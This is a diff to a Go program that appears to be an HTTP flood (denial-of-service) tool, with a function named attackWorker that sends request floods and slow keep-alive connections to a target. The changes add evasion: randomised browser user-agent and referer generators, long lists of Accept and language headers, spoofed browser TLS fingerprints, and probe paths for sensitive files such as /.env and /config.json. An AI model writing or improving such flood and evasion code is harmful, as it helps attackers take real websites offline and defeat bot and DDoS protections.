@@ -52,34 +52,154 @@ import (
 )
 
 var (
-	userAgents = []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
-		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
-	}
-
-	referers = []string{
-		"https://www.google.com/",
-		"https://www.bing.com/",
-		"https://duckduckgo.com/",
-		"https://facebook.com/",
-		"https://www.reddit.com/",
-		"https://www.youtube.com/",
-		"",
-	}
-
 	acceptLanguages = []string{
-		"en-US,en;q=0.9",
-		"en-GB,en;q=0.8",
-		"fr-FR,fr;q=0.9,en;q=0.8",
-		"de-DE,de;q=0.9,en;q=0.8",
-		"es-ES,es;q=0.9,en;q=0.8",
+	"en-US,en;q=0.9",
+	"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
+	"en-GB,en;q=0.9,en-US;q=0.8",
+	"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
+	"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
+	"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
+	"en-US,en;q=0.5",
+	"en-US;q=0.8,en;q=0.7",
+	"en-GB,en;q=0.9",
+	"en-CA,en;q=0.9",
+	"en-AU,en;q=0.9",
+	"en-NZ,en;q=0.9",
+	"en-ZA,en;q=0.9",
+	"en-IE,en;q=0.9",
+	"en-IN,en;q=0.9",
+	"ar-SA,ar;q=0.9",
+	"az-Latn-AZ,az;q=0.9",
+	"be-BY,be;q=0.9",
+	"bg-BG,bg;q=0.9",
+	"bn-IN,bn;q=0.9",
+	"ca-ES,ca;q=0.9",
+	"cs-CZ,cs;q=0.9",
+	"cy-GB,cy;q=0.9",
+	"da-DK,da;q=0.9",
+	"de-DE,de;q=0.9",
+	"el-GR,el;q=0.9",
+	"es-ES,es;q=0.9",
+	"et-EE,et;q=0.9",
+	"eu-ES,eu;q=0.9",
+	"fa-IR,fa;q=0.9",
+	"fi-FI,fi;q=0.9",
+	"fr-FR,fr;q=0.9",
+	"ga-IE,ga;q=0.9",
+	"gl-ES,gl;q=0.9",
+	"gu-IN,gu;q=0.9",
+	"he-IL,he;q=0.9",
+	"hi-IN,hi;q=0.9",
+	"hr-HR,hr;q=0.9",
+	"hu-HU,hu;q=0.9",
+	"hy-AM,hy;q=0.9",
+	"id-ID,id;q=0.9",
+	"is-IS,is;q=0.9",
+	"it-IT,it;q=0.9",
+	"ja-JP,ja;q=0.9",
+	"ka-GE,ka;q=0.9",
+	"kk-KZ,kk;q=0.9",
+	"km-KH,km;q=0.9",
+	"kn-IN,kn;q=0.9",
+	"ko-KR,ko;q=0.9",
+	"ky-KG,ky;q=0.9",
+	"lo-LA,lo;q=0.9",
+	"lt-LT,lt;q=0.9",
+	"lv-LV,lv;q=0.9",
+	"mk-MK,mk;q=0.9",
+	"ml-IN,ml;q=0.9",
+	"mn-MN,mn;q=0.9",
+	"mr-IN,mr;q=0.9",
+	"ms-MY,ms;q=0.9",
+	"mt-MT,mt;q=0.9",
+	"my-MM,my;q=0.9",
+	"nb-NO,nb;q=0.9",
+	"ne-NP,ne;q=0.9",
+	"nl-NL,nl;q=0.9",
+	"nn-NO,nn;q=0.9",
+	"or-IN,or;q=0.9",
+	"pa-IN,pa;q=0.9",
+	"pl-PL,pl;q=0.9",
+	"pt-BR,pt;q=0.9",
+	"pt-PT,pt;q=0.9",
+	"ro-RO,ro;q=0.9",
+	"ru-RU,ru;q=0.9",
+	"si-LK,si;q=0.9",
+	"sk-SK,sk;q=0.9",
+	"sl-SI,sl;q=0.9",
+	"sq-AL,sq;q=0.9",
+	"sr-Cyrl-RS,sr;q=0.9",
+	"sr-Latn-RS,sr;q=0.9",
+	"sv-SE,sv;q=0.9",
+	"sw-KE,sw;q=0.9",
+	"ta-IN,ta;q=0.9",
+	"te-IN,te;q=0.9",
+	"th-TH,th;q=0.9",
+	"tr-TR,tr;q=0.9",
+	"uk-UA,uk;q=0.9",
+	"ur-PK,ur;q=0.9",
+	"uz-Latn-UZ,uz;q=0.9",
+	"vi-VN,vi;q=0.9",
+	"zh-CN,zh;q=0.9",
+	"zh-HK,zh;q=0.9",
+	"zh-TW,zh;q=0.9",
+	"am-ET,am;q=0.8",
+	"as-IN,as;q=0.8",
+	"az-Cyrl-AZ,az;q=0.8",
+	"bn-BD,bn;q=0.8",
+	"bs-Cyrl-BA,bs;q=0.8",
+	"bs-Latn-BA,bs;q=0.8",
+	"dz-BT,dz;q=0.8",
+	"fil-PH,fil;q=0.8",
+	"fr-CA,fr;q=0.8",
+	"fr-CH,fr;q=0.8",
+	"fr-BE,fr;q=0.8",
+	"fr-LU,fr;q=0.8",
+	"gsw-CH,gsw;q=0.8",
+	"ha-Latn-NG,ha;q=0.8",
+	"hr-BA,hr;q=0.8",
+	"ig-NG,ig;q=0.8",
+	"ii-CN,ii;q=0.8",
+	"jv-Latn-ID,jv;q=0.8",
+	"kkj-CM,kkj;q=0.8",
+	"kl-GL,kl;q=0.8",
+	"kok-IN,kok;q=0.8",
+	"ks-Arab-IN,ks;q=0.8",
+	"lb-LU,lb;q=0.8",
+	"ln-CG,ln;q=0.8",
+	"mn-Mong-CN,mn;q=0.8",
+	"mr-MN,mr;q=0.8",
+	"ms-BN,ms;q=0.8",
+	"mua-CM,mua;q=0.8",
+	"nds-DE,nds;q=0.8",
+	"ne-IN,ne;q=0.8",
+	"nso-ZA,nso;q=0.8",
+	"oc-FR,oc;q=0.8",
+	"pa-Arab-PK,pa;q=0.8",
+	"ps-AF,ps;q=0.8",
+	"quz-BO,quz;q=0.8",
+	"quz-EC,quz;q=0.8",
+	"quz-PE,quz;q=0.8",
+	"rm-CH,rm;q=0.8",
+	"rw-RW,rw;q=0.8",
+	"sd-Arab-PK,sd;q=0.8",
+	"se-NO,se;q=0.8",
+	"smn-FI,smn;q=0.8",
+	"sms-FI,sms;q=0.8",
+	"syr-SY,syr;q=0.8",
+	"tg-Cyrl-TJ,tg;q=0.8",
+	"ti-ER,ti;q=0.8",
+	"tk-TM,tk;q=0.8",
+	"tn-ZA,tn;q=0.8",
+	"tt-RU,tt;q=0.8",
+	"ug-CN,ug;q=0.8",
+	"uz-Cyrl-UZ,uz;q=0.8",
+	"ve-ZA,ve;q=0.8",
+	"wo-SN,wo;q=0.8",
+	"xh-ZA,xh;q=0.8",
+	"yo-NG,yo;q=0.8",
+	"zgh-MA,zgh;q=0.8",
+	"zu-ZA,zu;q=0.8",
 	}
 
 	acceptHeaders = []string{
@@ -87,17 +207,76 @@ var (
 		"application/json, text/plain, */*",
 		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 		"*/*",
+	    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "application/json, text/plain, */*",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "application/json, text/plain, */*",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,*/*;q=0.8,application/json",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/wasm",
+        // 50 giá trị Accept header mới bổ sung//
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed,audio/mpeg",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed,audio/mpeg,video/mp4",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed,audio/mpeg,video/mp4,application/x-shockwave-flash"
 	}
 
 	acceptEncodings = []string{
 		"gzip, deflate, br",
 		"gzip, deflate",
+		"gzip, identity",
+		"deflate, gzip",
+		"compress, gzip",
+		"br",
+		"*",
 		"identity",
 	}
 
 	cacheControls = []string{
 		"no-cache",
 		"no-store",
+		"no-transform",
+        "only-if-cached",
+        "public",
+        "private",
+		"proxy-revalidate",
+		"s-maxage=86400",
 		"must-revalidate",
 		"max-age=0",
 	}
@@ -173,6 +352,36 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
+		NextProtos:       []string{"h2", "http/1.1"},
+		MinVersion:       tls.VersionTLS12,
+		MaxVersion:       tls.VersionTLS13,
+	},
+    {
+		Name: "Edge 146-150",
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		},
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
+		NextProtos:       []string{"h2", "http/1.1"},
+		MinVersion:       tls.VersionTLS12,
+		MaxVersion:       tls.VersionTLS13,
+	},
+	{
+		Name: "Safari 18",
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		},
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 		NextProtos:       []string{"h2", "http/1.1"},
 		MinVersion:       tls.VersionTLS12,
 		MaxVersion:       tls.VersionTLS13,
@@ -346,12 +555,135 @@ func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
 
-func randomUA() string {
-	return userAgents[randInt(0, len(userAgents)-1)]
+func generateRandomUA() string {
+	browserType := randInt(1, 100)
+	
+	// Windows versions (2025-2026)
+	windowsVersions := []string{
+		"Windows NT 10.0; Win64; x64",
+		"Windows NT 11.0; Win64; x64",
+		"Windows NT 12.0; Win64; x64",
+		"Windows NT 10.0; Win64; x64; Xbox",
+	}
+	
+	// macOS versions (2025-2026)
+	macVersions := []string{
+		"Macintosh; Intel Mac OS X 15_0",
+		"Macintosh; Intel Mac OS X 15_1",
+		"Macintosh; Intel Mac OS X 15_2",
+		"Macintosh; Intel Mac OS X 16_0",
+		"Macintosh; Intel Mac OS X 16_1",
+		"Macintosh; ARM Mac OS X 15_0",
+		"Macintosh; ARM Mac OS X 16_0",
+	}
+	
+	// Linux distributions
+	linuxVersions := []string{
+		"X11; Linux x86_64",
+		"X11; Ubuntu; Linux x86_64",
+		"X11; Fedora; Linux x86_64",
+		"X11; Debian; Linux x86_64",
+		"X11; Linux x86_64; Arch",
+	}
+	
+	// Chrome versions (2025-2026)
+	chromeMajor := randInt(141, 165)
+	chromeBuild := randInt(5000, 8000)
+	chromePatch := randInt(0, 99)
+	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
+	
+	// Firefox versions (2025-2026)
+	firefoxMajor := randInt(135, 165)
+	firefoxMinor := randInt(0, 9)
+	firefoxPatch := randInt(0, 99)
+	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
+	
+	// Edge versions (2025-2026)
+	edgeMajor := randInt(141, 165)
+	edgeBuild := randInt(5000, 8000)
+	edgePatch := randInt(0, 99)
+	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
+	
+	// Safari versions (2025-2026)
+	safariMajor := randInt(18, 22)
+	safariMinor := randInt(0, 5)
+	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
+	
+	// Mobile browsers
+	androidVersions := []string{"15", "16", "17"}
+	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
+	
+	if browserType <= 45 { // Chrome 45%
+		osType := randInt(1, 100)
+		var os string
+		if osType <= 40 {
+			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
+		} else if osType <= 70 {
+			os = macVersions[randInt(0, len(macVersions)-1)]
+		} else {
+			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
+		}
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, chromeVersion)
+	} else if browserType <= 75 { // Firefox 30%
+		osType := randInt(1, 100)
+		var os string
+		if osType <= 40 {
+			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
+		} else if osType <= 70 {
+			os = macVersions[randInt(0, len(macVersions)-1)]
+		} else {
+			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
+		}
+		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, firefoxVersion, firefoxVersion)
+	} else if browserType <= 88 { // Edge 13%
+		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, edgeVersion, edgeVersion)
+	} else if browserType <= 95 { // Safari 7%
+		os := macVersions[randInt(0, len(macVersions)-1)]
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, safariVersion)
+	} else { // Mobile browsers 5%
+		mobileType := randInt(1, 100)
+		if mobileType <= 60 { // Android Chrome
+			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
+			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, device, chromeVersion)
+		} else if mobileType <= 85 { // iPhone Safari
+			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
+			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
+			return fmt.Sprintf("Mozilla/5.0 (%s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, iosVersion, safariVersion)
+		} else { // Samsung Internet
+			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
+			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, samsungVersion, chromeVersion)
+		}
+	}
 }
 
 func randomReferer() string {
-	return referers[randInt(0, len(referers)-1)]
+	domains := []string{
+		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
+		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
+		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
+		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
+	}
+	
+	paths := []string{
+		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
+		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed",
+		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
+	}
+	
+	protocols := []string{"https", "http"}
+	protocol := protocols[randInt(0, len(protocols)-1)]
+	domain := domains[randInt(0, len(domains)-1)]
+	path := paths[randInt(0, len(paths)-1)]
+	
+	if randInt(1, 100) <= 70 {
+		path += "?q=" + randomString(randInt(3, 10))
+		if randBool() {
+			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
+		}
+	}
+	
+	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
 }
 
 func randomString(n int) string {
@@ -387,7 +719,12 @@ func generatePath() string {
 	paths := []string{
 		"/", "/index.html", "/home", "/main", "/default", "/welcome",
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
-		"/wp-admin", "/admin", "/login", "/dashboard",
+		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
+		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
+		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql", "wp-login.php",
+		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
+		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
+		"/.env", "/config.json", "/settings.ini", "/application.yml", 
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -574,7 +911,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 					continue
 				}
 				conn.SetDeadline(time.Now().Add(300 * time.Second))
-				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
+				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, generateRandomUA())
 				stats.inc()
 				time.Sleep(1 * time.Second)
 				conn.Close()
@@ -597,7 +934,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				continue
 			}
 
-			req.Header.Set("User-Agent", randomUA())
+			req.Header.Set("User-Agent", generateRandomUA())
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
 			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
